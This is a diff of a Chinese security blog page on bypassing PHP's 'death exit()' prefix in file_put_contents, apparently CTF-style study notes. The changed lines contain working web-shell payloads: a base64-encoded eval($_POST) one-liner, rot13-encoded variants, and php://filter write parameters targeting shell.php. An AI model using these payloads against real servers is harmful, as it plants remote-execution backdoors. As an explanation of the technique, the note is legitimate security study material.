@@ -17,7 +17,7 @@
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://csd0617.github.io';</script>
   
   <title>
-    php死亡exit()绕过(待补充) |
+    php死亡exit()绕过 |
     
     达达
   </title>
@@ -37,11 +37,13 @@
   
     <meta name="description" content="php死亡exit()绕过需要绕过exit()的地方一般都是file_put_contents 大致有如下三种 123file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);file_put">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php死亡exit()绕过(待补充)">
+<meta property="og:title" content="php死亡exit()绕过">
 <meta property="og:url" content="http://csd0617.github.io/2025/04/14/php%E6%AD%BB%E4%BA%A1exit()%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="达达">
 <meta property="og:description" content="php死亡exit()绕过需要绕过exit()的地方一般都是file_put_contents 大致有如下三种 123file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);file_put">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250425090647726.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250425124011961.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250425092117679.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250425093205021.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250402074843701.png">
@@ -55,10 +57,10 @@
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250425084909300.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250424215832997.png">
 <meta property="article:published_time" content="2025-04-14T02:56:00.000Z">
-<meta property="article:modified_time" content="2025-04-25T07:13:04.268Z">
+<meta property="article:modified_time" content="2025-04-25T10:13:05.341Z">
 <meta property="article:author" content="达达">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250425092117679.png">
+<meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250425090647726.png">
   
   
     <link rel="alternate" href="/atom.xml" title="达达" type="application/atom+xml">
@@ -185,7 +187,7 @@
 <header id="header">
   
     <picture></picture>
-    <img  fetchpriority="high" src="/../covers/10.jpg" alt="php死亡exit()绕过(待补充)">
+    <img  fetchpriority="high" src="/../covers/10.jpg" alt="php死亡exit()绕过">
   
   <div id="header-outer">
     <div id="header-title">
@@ -193,7 +195,7 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">php死亡exit()绕过(待补充)</h1>
+            <h1 data-aos="slide-up">php死亡exit()绕过</h1>
           </a>
         
       
@@ -220,7 +222,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">过滤器嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%8C%E6%88%91%E8%AE%B0%E5%BE%97%E6%88%91%E4%B9%8B%E5%89%8D%E6%88%90%E5%8A%9F%E8%BF%87%E4%B8%80%E6%AC%A1%E5%95%8A-%E5%A5%87%E6%80%AA%EF%BC%89"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">.htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊  奇怪）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">rot13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#convert-iconv-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">convert.iconv.*过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-2"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">USC-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-4"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">USC-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8utf-8%E8%BD%AC%E4%B8%BAutf-7"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">使用utf-8转为utf-7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">1.0.2.6.1.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">1.0.2.6.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">1.0.2.6.3.</span> <span class="toc-text">三</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.3.</span> <span class="toc-text">第三种情况</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">rot13编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">过滤器嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%8C%E6%88%91%E8%AE%B0%E5%BE%97%E6%88%91%E4%B9%8B%E5%89%8D%E6%88%90%E5%8A%9F%E8%BF%87%E4%B8%80%E6%AC%A1%E5%95%8A-%E5%A5%87%E6%80%AA%EF%BC%89"><span class="toc-number">1.0.1.4.</span> <span class="toc-text">.htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊  奇怪）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">rot13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#convert-iconv-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">convert.iconv.*过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-2"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">USC-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-4"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">USC-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8utf-8%E8%BD%AC%E4%B8%BAutf-7"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">使用utf-8转为utf-7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">1.0.2.6.1.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">1.0.2.6.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">1.0.2.6.3.</span> <span class="toc-text">三</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.3.</span> <span class="toc-text">第三种情况</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -337,47 +339,35 @@
 
 <p>前面加个a的原因是base64解码以4个字节为1组转换为3个字节</p>
 <p>前面的&lt;?php exit(); 符合base64编码的只有phpexit这七个字节，因此添加一个字节来满足编码</p>
-<?  空格  ;  为什么不算呢？
+<p>&lt;?  空格  ;  为什么不算呢？</p>
+<p><strong>Base64 解码时，符号的处理方式</strong></p>
+<p>在 PHP 中，<code>base64_decode()</code> 只处理 <strong>Base64 允许的字符</strong>，即：</p>
+<ul>
+<li><code>A-Z</code></li>
+<li><code>a-z</code></li>
+<li><code>0-9</code></li>
+<li><code>+</code> 和 <code>/</code></li>
+<li><code>=</code>（填充符）</li>
+</ul>
+<p><strong>任何不在这个范围内的符号</strong>（例如空格、<code>&lt;</code>, <code>?</code>, <code>;</code>）：</p>
+<ul>
+<li>如果出现在 Base64 数据中，可能会被忽略、导致解码失败，或者返回 <code>false</code>（如果 <code>strict</code> 参数为 <code>true</code>）。</li>
+<li>但 <code>base64_decode()</code> <strong>不会把它们当作特殊字符处理</strong>，它只是单纯地按照 Base64 规则解析。</li>
+</ul>
+<p>所以base解码并不会识别&lt;?  空格  ;  也就是只有七个字节需要加一个字节来凑一下  使其满足编码</p>
+<p>解码 &lt;?php exit();aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs&#x2F;Pg&#x3D;&#x3D; 的结果</p>
+<p><img src="/../picture/image-20250425090647726.png" alt="image-20250425090647726"></p>
+<h4 id="rot13编码绕过"><a href="#rot13编码绕过" class="headerlink" title="rot13编码绕过"></a>rot13编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/string.rot13/resource=shell.php</span><br><span class="line">content=&lt;?cuc @riny($_CBFG[furyy]);?&gt;</span><br></pre></td></tr></table></figure>
 
-**Base64 解码时，符号的处理方式**
-
-在 PHP 中，`base64_decode()` 只处理 **Base64 允许的字符**，即：
-
-- `A-Z`
-- `a-z`
-- `0-9`
-- `+` 和 `/`
-- `=`（填充符）
-
-**任何不在这个范围内的符号**（例如空格、`<`, `?`, `;`）：
-
-- 如果出现在 Base64 数据中，可能会被忽略、导致解码失败，或者返回 `false`（如果 `strict` 参数为 `true`）。
-- 但 `base64_decode()` **不会把它们当作特殊字符处理**，它只是单纯地按照 Base64 规则解析。
-
-所以base解码并不会识别<?  空格  ;  也就是只有七个字节需要加一个字节来凑一下  使其满足编码
-
-解码 \<?php exit();aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg== 的结果
-
-![image-20250425090647726](../picture/image-20250425090647726.png)
-
-#### rot13编码绕过
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/string.rot13/resource=shell.php</span><br><span class="line">content=&lt;?cuc @riny($_CBFG[furyy]);?&gt;</span><br></pre></td></tr></table></figure>
-
-原理同上  因为rot13编码不用考虑前面的字符长度，更为方便
-
+<p>原理同上  因为rot13编码不用考虑前面的字符长度，更为方便</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit();&lt;?cuc @riny($_CBFG[furyy]);?&gt;</span><br></pre></td></tr></table></figure>
 
-解码结果    
-
-![image-20250425124011961](../picture/image-20250425124011961.png)
-
-但有局限性，如果开启了短标签的话，前面内容就会解析，导致代码错误
-
+<p>解码结果    </p>
+<p><img src="/../picture/image-20250425124011961.png" alt="image-20250425124011961"></p>
+<p>但有局限性，如果开启了短标签的话，前面内容就会解析，导致代码错误</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[shell]);?&gt;-&gt;&lt;?cuc @riny($_CBFG[furyy]);?&gt;</span><br></pre></td></tr></table></figure>
 
-通过string.rot13过滤器解码后的结果为\<?php @eval();?>
-
+<p>通过string.rot13过滤器解码后的结果为&lt;?php @eval();?&gt;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$encoded = &quot;&lt;?php exit();php://filter/string.rot13|&lt;?php exit();&lt;?cuc @riny($_CBFG[furyy]);?&gt;|/resource=shell.php&quot;;</span><br><span class="line">$decoded = str_rot13($encoded);</span><br><span class="line">echo $decoded;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../picture/image-20250425092117679.png" alt="image-20250425092117679"></p>
@@ -596,10 +586,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        25.5k
+        27.4k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        01:47
+        01:55
       </div>
     
     
@@ -632,7 +622,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">过滤器嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%8C%E6%88%91%E8%AE%B0%E5%BE%97%E6%88%91%E4%B9%8B%E5%89%8D%E6%88%90%E5%8A%9F%E8%BF%87%E4%B8%80%E6%AC%A1%E5%95%8A-%E5%A5%87%E6%80%AA%EF%BC%89"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">.htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊  奇怪）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">rot13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#convert-iconv-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">convert.iconv.*过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-2"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">USC-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-4"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">USC-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8utf-8%E8%BD%AC%E4%B8%BAutf-7"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">使用utf-8转为utf-7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">1.0.2.6.1.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">1.0.2.6.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">1.0.2.6.3.</span> <span class="toc-text">三</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.3.</span> <span class="toc-text">第三种情况</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">rot13编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">过滤器嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%8C%E6%88%91%E8%AE%B0%E5%BE%97%E6%88%91%E4%B9%8B%E5%89%8D%E6%88%90%E5%8A%9F%E8%BF%87%E4%B8%80%E6%AC%A1%E5%95%8A-%E5%A5%87%E6%80%AA%EF%BC%89"><span class="toc-number">1.0.1.4.</span> <span class="toc-text">.htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊  奇怪）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">rot13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#convert-iconv-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">convert.iconv.*过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-2"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">USC-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-4"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">USC-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8utf-8%E8%BD%AC%E4%B8%BAutf-7"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">使用utf-8转为utf-7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">1.0.2.6.1.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">1.0.2.6.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">1.0.2.6.3.</span> <span class="toc-text">三</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.3.</span> <span class="toc-text">第三种情况</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -781,13 +771,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "达达",
-          title: "php死亡exit()绕过(待补充)",
+          title: "php死亡exit()绕过",
           url: "http://csd0617.github.io/2025/04/14/php%E6%AD%BB%E4%BA%A1exit()%E7%BB%95%E8%BF%87/",
           excerpt: "",
           description: "",
           stripContent: "php死亡exit()绕过需要绕过exit()的地方一般都是file_put_contents 大致有如下三种 123file_put_contents($filename,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);file_put_contents($content,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);file_put_contents($filename,$content . &amp;quot;\nxxxxxx&amp;quot",
           date: "Mon Apr 14 2025 10:56:00 GMT+0800",
-          updated: "Fri Apr 25 2025 15:13:04 GMT+0800",
+          updated: "Fri Apr 25 2025 18:13:05 GMT+0800",
           cover: "/../covers/10.jpg",
         };
       </script>
